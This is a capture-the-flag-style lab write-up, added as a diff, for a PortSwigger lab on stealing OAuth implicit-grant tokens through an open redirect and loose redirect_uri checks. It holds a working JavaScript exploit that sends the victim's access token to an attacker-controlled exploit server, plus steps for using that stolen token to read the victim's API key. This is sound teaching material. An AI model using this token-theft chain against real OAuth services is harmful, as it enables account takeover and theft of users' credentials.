@@ -1,0 +1,153 @@
+# Lab 04 — Stealing OAuth Access Tokens via an Open Redirect
+
+**Platform:** PortSwigger Web Security Academy  
+**Difficulty:** Practitioner
+
+---
+
+## What this lab is about
+
+This one chains two separate vulnerabilities together — an open redirect and a weakness in how the OAuth server validates `redirect_uri`. The end goal is to steal a victim's access token by tricking the OAuth server into sending it to a URL we control.
+
+What makes this different from the previous lab is the grant type. Here the app is using the **implicit grant type** (`response_type=token`), which means the access token comes back directly in the URL fragment (`#access_token=...`) instead of an authorization code. Fragments never get sent to a server in HTTP requests — they stay in the browser — so the challenge is building an exploit that can extract the token from the fragment and send it somewhere we can read it.
+
+---
+
+## Step 1 — Find the open redirect
+
+Browse the blog on the target site and click on any post. At the bottom of each post there's a "Next post" link. Intercept that request in Burp and you'll see it hits an endpoint like this:
+
+```
+GET /post/next?path=/post?postId=2
+```
+
+The `path` parameter controls where the redirect goes. Test it by pointing it at an external URL:
+
+```
+https://<lab-id>.web-security-academy.net/post/next?path=https://google.com
+```
+
+Check the response — the `Location` header is set to whatever you put in `path`, no questions asked. That's your open redirect.
+
+---
+
+## Step 2 — Understand the attack chain
+
+Before writing the exploit, it helps to think through how these two bugs connect.
+
+The OAuth server validates that `redirect_uri` belongs to the registered client. But it's doing a loose prefix check rather than an exact match. That means if we can construct a URL that *starts with* the registered callback path but eventually navigates somewhere else, it'll pass validation.
+
+The registered callback is something like:
+
+```
+https://<lab-id>.web-security-academy.net/oauth-callback
+```
+
+If we add path traversal — `oauth-callback/../../post/next` — that resolves to `/post/next` on the same domain. The OAuth server sees the right domain and approves it. What it doesn't catch is that `/post/next` will immediately redirect to wherever `path` points, which we set to our exploit server.
+
+Here's the full sequence once the victim is on our exploit page:
+
+1. Victim lands on exploit server page → no fragment in the URL yet
+2. Page redirects them to the OAuth authorization URL with our crafted `redirect_uri`
+3. OAuth server sees the victim is already logged in, auto-approves, and issues a redirect to the `redirect_uri` with the token in the fragment: `https://<lab-id>.web-security-academy.net/post/next?path=https://<exploit-server>/exploit#access_token=...`
+4. The open redirect at `/post/next` sends the browser to `https://<exploit-server>/exploit#access_token=...`
+5. The browser lands back on our exploit page, this time with the token in the fragment
+6. The script detects the fragment and fires a request to our server that includes the token in the query string, which shows up in the access log
+
+---
+
+## Step 3 — Build the OAuth URL
+
+Go to Burp and grab the OAuth authorization request from your own login flow. It'll look like:
+
+```
+https://oauth-<id>.oauth-server.net/auth
+  ?client_id=<client_id>
+  &redirect_uri=https://<lab-id>.web-security-academy.net/oauth-callback
+  &response_type=token
+  &nonce=<any_value>
+  &scope=openid%20profile%20email
+```
+
+Now modify the `redirect_uri` to use path traversal pointing to the open redirect, and set `path` to your exploit server URL:
+
+```
+redirect_uri=https://<lab-id>.web-security-academy.net/oauth-callback/../../post/next?path=https://<exploit-server>/exploit
+```
+
+The path traversal (`/../../`) takes `oauth-callback/../../` back up to the root, resolving the final path to `/post/next`. The OAuth server validates the domain, sees it matches, and lets it through.
+
+---
+
+## Step 4 — Write the exploit script
+
+On the exploit server, put this in the body:
+
+```html
+<script>
+if (!document.location.hash) {
+    window.location = "https://oauth-<id>.oauth-server.net/auth?client_id=<client_id>&redirect_uri=https://<lab-id>.web-security-academy.net/oauth-callback/../../post/next?path=https://<exploit-server>/exploit&response_type=token&nonce=<any_value>&scope=openid%20profile%20email"
+} else {
+    window.location = '/?'+document.location.hash.substr(1)
+}
+</script>
+```
+
+What this does:
+
+- **First visit (no hash):** Sends the victim through the OAuth flow using our tampered `redirect_uri`.
+- **Second visit (with hash):** The token is now sitting in `document.location.hash`. The script strips the `#` and appends the rest as a query string, then redirects to `/?access_token=...`. That's a GET request that shows up in the exploit server's access log.
+
+The reason we need to convert the fragment to a query string is that fragments are never sent to the server. By redirecting to `/?<token>`, we make the browser send it as part of the URL path, which the server does log.
+
+---
+
+## Step 5 — Deliver and capture the token
+
+Save the script on the exploit server and click **Deliver Exploit to Victim**.
+
+Then check the access logs. You'll see a request like:
+
+```
+GET /?access_token=<token>&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
+```
+
+Copy the `access_token` value.
+
+---
+
+## Step 6 — Use the token to access the API
+
+Now you need to find out who you're authenticated as. Send a GET request to the OAuth server's userinfo endpoint with the stolen token in the Authorization header:
+
+```
+GET /me HTTP/1.1
+Host: oauth-<id>.oauth-server.net
+Authorization: Bearer <stolen_access_token>
+```
+
+The response will give you the victim's profile including their `apiKey`.
+
+---
+
+## Step 7 — Get the API key and finish the lab
+
+Take that `apiKey` from the response and submit it on the lab page. Lab solved.
+
+---
+
+## Why this works
+
+Two misconfigurations made this possible. First, the OAuth server was doing a loose prefix check on `redirect_uri` instead of exact matching — which is exactly what the RFCs warn against. Path traversal only works because of this.
+
+Second, the app uses the implicit grant type, which puts the token directly in the URL fragment. The whole attack depends on that fragment being accessible to JavaScript on the page. The authorization code flow doesn't have this problem because the token never appears in the URL — it's exchanged server-side.
+
+If the OAuth server enforced exact `redirect_uri` matching, the path traversal trick wouldn't work regardless of whether there's an open redirect on the site.
+
+---
+
+## References
+
+- https://portswigger.net/web-security/oauth
+- https://datatracker.ietf.org/doc/html/rfc6749#section-10.6
+- https://portswigger.net/web-security/oauth/grant-types
